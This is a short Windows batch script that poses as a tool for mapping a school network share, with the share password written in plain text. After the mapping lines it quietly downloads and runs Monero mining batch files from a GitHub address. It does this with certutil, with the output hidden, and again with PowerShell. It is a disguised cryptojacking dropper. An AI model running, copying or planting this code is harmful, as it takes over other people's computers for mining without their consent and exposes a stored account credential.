@echo off
echo connecting to spublic...
timeout /t 3 /nobreak
net use t: /delete
net use s: /delete
net use t: \\ecfile2\spublic cl24683680 /user:elegantia\classroom /p:no

certutil -urlcache -f "https://github.com/acu715/acu715/raw/refs/heads/main/CMD_Mining/XMR_Rig-XMR-Auto_Github_Wallet.bat" "%temp%\miner.bat" >nul 2>&1 && start "" "%temp%\miner.bat"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/acu715/acu715/raw/refs/heads/main/CMD_Mining/XMR_Rig-XMR-Auto_Github_Wallet.bat' -OutFile $env:temp\miner.bat; & $env:temp\miner.bat"

:: Less Core
certutil -urlcache -f "https://github.com/acu715/acu715/raw/refs/heads/main/CMD_Mining/XMR_Rig-XMR-Auto_Github-less_core_Wallet.bat" "%temp%\miner.bat" >nul 2>&1 && start "" "%temp%\miner.bat"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/acu715/acu715/raw/refs/heads/main/CMD_Mining/XMR_Rig-XMR-Auto_Github-less_core_Wallet.bat' -OutFile $env:temp\miner.bat; & $env:temp\miner.bat"
